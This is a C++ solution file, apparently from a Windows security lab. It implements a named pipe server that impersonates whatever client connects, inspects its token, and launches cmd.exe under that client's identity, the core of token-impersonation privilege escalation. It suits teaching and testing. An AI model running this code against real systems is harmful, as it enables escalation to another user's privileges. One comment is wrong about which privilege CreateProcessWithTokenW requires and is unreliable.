/*
  Solution 01 — Named Pipe Impersonation Server
  -----------------------------------------------
  Complete implementation of the named pipe server that:
    1. Creates a named pipe and waits for a client connection.
    2. Impersonates the connected client via ImpersonateNamedPipeClient.
    3. Queries the impersonated token for user and integrity level.
    4. Duplicates the token and spawns cmd.exe as the impersonated user.
    5. Reverts to self after done.

  Compile:
    g++ -std=c++17 -Wall -o sol01_server.exe sol01_named_pipe_server.cpp
  Run server first, then run sol02 client in a second window.
*/

#include <windows.h>
#include <sddl.h>
#include <string>
#include <vector>
#include <cstdio>

// ---- Helper: get current thread/process identity ----
std::string whoAmI(bool impersonated) {
    HANDLE hToken = nullptr;
    BOOL ok = impersonated
        ? OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)
        : OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);

    if (!ok) return "(unknown — " + std::to_string(GetLastError()) + ")";

    DWORD sz = 0;
    GetTokenInformation(hToken, TokenUser, nullptr, 0, &sz);
    std::vector<BYTE> buf(sz);
    if (!GetTokenInformation(hToken, TokenUser, buf.data(), sz, &sz)) {
        CloseHandle(hToken);
        return "(GetTokenInformation failed)";
    }
    TOKEN_USER* tu = reinterpret_cast<TOKEN_USER*>(buf.data());

    char name[256] = {}, domain[256] = {};
    DWORD nl = sizeof(name), dl = sizeof(domain);
    SID_NAME_USE use;
    LookupAccountSidA(nullptr, tu->User.Sid, name, &nl, domain, &dl, &use);
    CloseHandle(hToken);
    return std::string(domain) + "\\" + name;
}

// ---- Helper: get integrity level from a token ----
std::string getIntegrityLevel(HANDLE hToken) {
    DWORD sz = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, 0, &sz);
    if (!sz) return "Unknown";
    std::vector<BYTE> buf(sz);
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, buf.data(), sz, &sz))
        return "Unknown";

    auto* tml = reinterpret_cast<TOKEN_MANDATORY_LABEL*>(buf.data());
    DWORD rid = *GetSidSubAuthority(
        tml->Label.Sid,
        *GetSidSubAuthorityCount(tml->Label.Sid) - 1);

    if (rid >= SECURITY_MANDATORY_SYSTEM_RID)          return "System";
    if (rid >= SECURITY_MANDATORY_HIGH_RID)            return "High";
    if (rid >= SECURITY_MANDATORY_MEDIUM_RID)          return "Medium";
    if (rid >= SECURITY_MANDATORY_LOW_RID)             return "Low";
    return "Untrusted";
}

// ---- TODO 1: createPipe ----
HANDLE createPipe(const std::string& pipeName) {
    return CreateNamedPipeA(
        pipeName.c_str(),
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1,       // max instances — exactly one, to force a single client
        4096,    // outbound buffer
        4096,    // inbound buffer
        0,       // default timeout
        nullptr  // default security — any user can connect
    );
}

// ---- TODO 2: waitForConnection ----
bool waitForConnection(HANDLE hPipe) {
    BOOL ok = ConnectNamedPipe(hPipe, nullptr);
    return ok || GetLastError() == ERROR_PIPE_CONNECTED;
}

// ---- TODO 3: impersonateClient ----
bool impersonateClient(HANDLE hPipe) {
    return ImpersonateNamedPipeClient(hPipe) == TRUE;
}

int main(int argc, char* argv[]) {
    const char* pipeName = (argc > 1) ? argv[1] : "\\\\.\\pipe\\TestPipe";

    printf("[*] Named Pipe Impersonation Server\n");
    printf("[*] Creating pipe: %s\n", pipeName);
    printf("[*] Running as: %s\n", whoAmI(false).c_str());

    // --- Step 1: Create the pipe ---
    HANDLE hPipe = createPipe(pipeName);
    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipeA failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] Pipe created. Waiting for client...\n");

    // --- Step 2: Wait for client connection ---
    if (!waitForConnection(hPipe)) {
        printf("[-] ConnectNamedPipe failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }
    printf("[+] Client connected!\n");

    // --- Optional: read the client message ---
    char msg[512] = {};
    DWORD bytesRead = 0;
    if (ReadFile(hPipe, msg, sizeof(msg) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        printf("[*] Client sent: %s\n", msg);
    }

    // --- Send a reply so the client can see it ---
    const char* reply = "ACK from server";
    DWORD written = 0;
    WriteFile(hPipe, reply, (DWORD)strlen(reply), &written, nullptr);

    // --- Step 3: Impersonate ---
    if (!impersonateClient(hPipe)) {
        printf("[-] ImpersonateNamedPipeClient failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }
    printf("[+] Impersonation succeeded.\n");
    printf("[+] Now running as: %s\n", whoAmI(true).c_str());

    // --- Step 4: Examine the impersonated token ---
    HANDLE hToken = nullptr;
    if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hToken)) {
        // Print user
        DWORD sz = 0;
        GetTokenInformation(hToken, TokenUser, nullptr, 0, &sz);
        std::vector<BYTE> userBuf(sz);
        if (GetTokenInformation(hToken, TokenUser, userBuf.data(), sz, &sz)) {
            auto* tu = reinterpret_cast<TOKEN_USER*>(userBuf.data());
            char name[256] = {}, domain[256] = {};
            DWORD nl = sizeof(name), dl = sizeof(domain);
            SID_NAME_USE use;
            LookupAccountSidA(nullptr, tu->User.Sid, name, &nl, domain, &dl, &use);
            printf("[+] Token user: %s\\%s\n", domain, name);
        }

        // Print integrity level
        printf("[+] Integrity level: %s\n", getIntegrityLevel(hToken).c_str());

        // --- Step 5: Duplicate token and spawn cmd.exe as impersonated user ---
        HANDLE hDup = nullptr;
        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr,
                             SecurityImpersonation, TokenPrimary, &hDup)) {
            STARTUPINFOW si = {};
            si.cb = sizeof(si);
            PROCESS_INFORMATION pi = {};

            wchar_t cmdLine[] = L"C:\\Windows\\System32\\cmd.exe";
            if (CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
                                         nullptr, cmdLine,
                                         CREATE_NEW_CONSOLE,
                                         nullptr, nullptr, &si, &pi)) {
                printf("[+] Spawned cmd.exe (PID=%lu) as impersonated user\n",
                       pi.dwProcessId);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                // CreateProcessWithTokenW requires SeAssignPrimaryTokenPrivilege
                // which is not always available; fall back to a note.
                printf("[!] CreateProcessWithTokenW failed: %lu\n", GetLastError());
                printf("    (Requires SeAssignPrimaryTokenPrivilege — try from SYSTEM)\n");
            }
            CloseHandle(hDup);
        }

        CloseHandle(hToken);
    }

    // --- Step 6: Revert ---
    RevertToSelf();
    printf("[*] Reverted to self: %s\n", whoAmI(false).c_str());

    // Disconnect and clean up
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    return 0;
}
